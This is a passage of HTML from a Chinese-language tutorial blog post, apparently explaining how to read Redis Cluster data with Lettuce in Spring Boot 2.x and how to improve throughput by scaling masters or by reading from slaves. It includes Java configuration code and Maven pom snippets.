class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.nodes\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getProperty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.nodes\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.timeout\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getProperty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.timeout\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.max-redirects\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getProperty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.max-redirects\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-16\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisClusterConfiguration </span><span class=\"crayon-v\">redisClusterConfiguration</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-18\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redisClusterConfiguration</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisClusterConfiguration</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MapPropertySource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"RedisClusterConfiguration\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-20\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LettuceConnectionFactory</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisClusterConfiguration</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-22\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-23\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p>（5）在业务类service中注入Lettuce相关的RedisTemplate，进行相关操作。以下是我化简到了springbootstarter中进行，参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67105431a191088599\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@SpringBootApplication\r\npublic class NewRedisClientApplication {\r\n\r\n    public static void main(String[] args) {\r\n        ApplicationContext context = SpringApplication.run(NewRedisClientApplication.class, args);\r\n        RedisTemplate redisTemplate  = (RedisTemplate)context.getBean(\"redisTemplate\");\r\n        String rtnValue = (String)redisTemplate.opsForValue().get(\"event:10\");\r\n        System.out.println(rtnValue);\r\n\r\n    }\r\n}  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105431a191088599-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105431a191088599-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105431a191088599-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105431a191088599-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105431a191088599-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105431a191088599-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">SpringBootApplication</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105431a191088599-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NewRedisClientApplication</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105431a191088599-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">ApplicationContext </span><span class=\"crayon-v\">context</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SpringApplication</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">NewRedisClientApplication</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">class</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105431a191088599-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">RedisTemplate </span><span class=\"crayon-v\">redisTemplate</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">RedisTemplate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBean</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"redisTemplate\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rtnValue</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">redisTemplate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">opsForValue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"event:10\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105431a191088599-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rtnValue</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105431a191088599-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105431a191088599-11\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0124 seconds] -->\r\n<p>运行结果的截图如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/a5105345be0d55526431f333581b770d.png\" alt=\"\"></p>\n<p>以上的介绍，是采用Jedis以及Lettuce对redis-cluster数据的简单读取。Jedis也好，Lettuce也好，其对于redis-cluster架构下的数据的读取，都是默认是按照redis官方对redis-cluster的设计，自动进行重定向到master节点中进行的，哪怕是我们在配置中列出了所有的master节点和slave节点。查阅了Jedis以及Lettuce的github上的源码，默认不支持redis-cluster下的读写分离，可以看出Jedis若要支持redis-cluster架构下的读写分离，需要自己改写和构建多一些包装类，定义好Master和slave节点的逻辑；而Lettuce的源码中，实际上预留了方法（setReadForm(ReadFrom.SLAVE)）进行redis-cluster架构下的读写分离，相对来说修改会简单一些，具体可以参考后面的章节。</p>\n<p> </p>\n<h2>redis-cluster架构下的读写能力的优化方案</h2>\n<p>在上面的一些章节中，已经有讲到redis近年来的高可用架构的演变，以及在redis-cluster架构下，官方对redis-master、redis-slave的其实有使用上的建议，即redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。<br>\n具体可以参阅redis官方文档（https://redis.io/commands/readonly），以下是reids在线文档中，对slave的readonly说明内容：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/3c543cc919ef1f4e2de23ec65b0ca14f.png\" alt=\"\"></p>\n<p>实际上本身master就是可以任意扩展的，所以如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向水平扩展就可以了。也就是说，扩容master，跟之前扩容slave并进行读写分离，效果是一样的或者说更好。<br>\n所以下面我们将按照redis-cluster架构下分别进行水平扩展Master，以及在redis-cluster架构下对master、slave进行读写分离两套方案进行讲解。</p>\n<p> </p>\n<h3>（一）水平扩展Master实例来进行redis-cluster性能的提升</h3>\n<p>redis官方在线文档以及一些互联网的参考资料都表明，在redis-cluster架构下，实际上不建议做物理的读写分离。那么如果我们真的不做读写分离的话，能否通过简单的方法进行redis-cluster下的性能的提升？我们可以通过master的水平扩展，来横向扩展读写吞吐量，并且能支撑更多的海量数据。<br>\n对master进行水平扩展有两种方法，一种是单机上面进行master实例的增加（建议每新增一个master，也新增一个对应的slave），另一种是新增机器部署新的master实例（同样建议每新增一个master，也新增一个对应的slave）。当然，我们也可以进行这两种方法的有效结合。</p>\n<p>（1）单机上通过多线程建立新redis-master实例，即逻辑上的水平扩展：<br>\n一般的，对于redis单机，单线程的读吞吐是4w/s~5W/s，写吞吐为2w/s。<br>\n单机合理开启redis多线程情况下（一般线程数为CPU核数的倍数），总吞吐量会有所上升，但每个线程的平均处理能力会有所下降。例如一个2核CPU，开启2线程的时候，总读吞吐能上升是6W/s~7W/s，即每个线程平均约3W/s再多一些。但过多的redis线程反而会限制了总吞吐量。</p>\n<p>（2）扩展更多的机器，部署新redis-master实例，即物理上的水平扩展：<br>\n例如，我们可以再原来只有3台master的基础上，连入新机器继续新实例的部署，最终水平扩展为6台master（建议每新增一个master，也新增一个对应的slave）。例如之前每台master的处理能力假设是读吞吐5W/s,写吞吐2W/s,扩展前一共的处理能力是：15W/s读，6W/s写。如果我们水平扩展到6台master，读吞吐可以达到总量30W/s，写可以达到12w/s，性能能够成倍增加。</p>\n<p>（3）若原本每台部署redis-master实例的机器都性能良好，则可以通过上述两者的结合，进行一个更优的组合。</p>\n<p>使用该方案进行redis-cluster性能的提升的优点有：<br>\n（1）符合redis官方要求和数据的准确性。<br>\n（2）真正达到更大吞吐量的性能扩展。<br>\n（3）无需代码的大量更改，只需在配置文件中重新配置新的节点信息。</p>\n<p>当然缺点也是有的：<br>\n（1）需要新增机器，提升性能，即成本会增加。<br>\n（2）若不新增机器，则需要原来的实例所运行的机器性能较好，能进行以多线程的方式部署新实例。但随着线程的增多，而机器的能力不足以支撑的时候，实际上总体能力会提升不太明显。<br>\n（3）redis-cluster进行新的水平扩容后，需要对master进行新的hash slot重新分配，这相当于需要重新加载所有的key，并按算法平均分配到各个Master的slot当中。</p>\n<p> </p>\n<h3>（二）引入Lettuce以及修改相关方法，达到对redis-cluster的读写分离</h3>\n<p>通过上面的一些章节，我们已经可以了解到Lettuce客户端读取redis的一些操作，使用Lettuce能体现出了简单，安全，高效。实际上，查阅了Lettuce对redis的读写，许多地方都进行了redis的读写分离。但这些都是基于上述redis架构中最普通的主从分离架构下的读写分离，而对于redis-cluster架构下，Lettuce可能是遵循了redis官方的意见，在该架构下，Lettuce在源码中直接设置了只由master上进行读写（具体参见gitHub的Lettuce项目）：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/f92997791460a2b7397c4ace6daf3e69.png\" alt=\"\"></p>\n<p>那么如果真的需要让Lettuce改为能够读取redis-cluster的slave，进行读写分离，是否可行？实际上还是可以的。这就需要我们自己在项目中进行二次加工，即不使用spring-boot中的默认Lettuce初始化方法，而是自己去写一个属于自己的Lettuce的新RedisClusterClient的连接，并且对该RedisClusterClient的连接进行一个比较重要的设置，那就是由connection.setReadFrom(ReadFrom.MASTER)改为connection.setReadFrom(ReadFrom.SLAVE)。</p>\n<p>下面我们开始对之前章节中的Lettuce读取redis-cluster数据的例子，进行改写，让Lettuce能够支持该架构下的读写分离：</p>\n<p>spring boot 2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。<br>\n同样，例如我们有6台机器组成的redis-cluster：<br>\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005<br>\n其中master机器对应端口：7000、7004、7005<br>\nslave对应端口：7001、7002、7003<br>\n在spring boot 2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：<br>\n（1）pom文件参考如下：<br>\nparent中指出spring boot的版本，要求2.X以上：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054321810643949\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;parent&gt;\r\n &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n &lt;version&gt;2.0.4.RELEASE&lt;/version&gt;\r\n &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\r\n&lt;/parent&gt;\r\n&lt;!-- lookup parent from repository --&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054321810643949-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054321810643949-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054321810643949-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054321810643949-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054321810643949-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054321810643949-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054321810643949-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054321810643949-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054321810643949-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">springframework</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054321810643949-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">spring</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">starter</span><span class=\"crayon-o\">-</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054321810643949-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">2.0.4.RELEASE</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054321810643949-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">relativePath</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lookup </span><span class=\"crayon-r\">parent</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">repository</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054321810643949-6\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054321810643949-7\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lookup </span><span class=\"crayon-r\">parent</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">repository</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>依赖中需要加入spring-boot-starter-data-redis，参考如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054326833245169\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;dependency&gt;\r\n &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;\r\n&lt;/dependency&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054326833245169-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054326833245169-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054326833245169-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054326833245169-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054326833245169-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054326833245169-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">springframework</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054326833245169-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">spring</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">starter</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054326833245169-4\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span 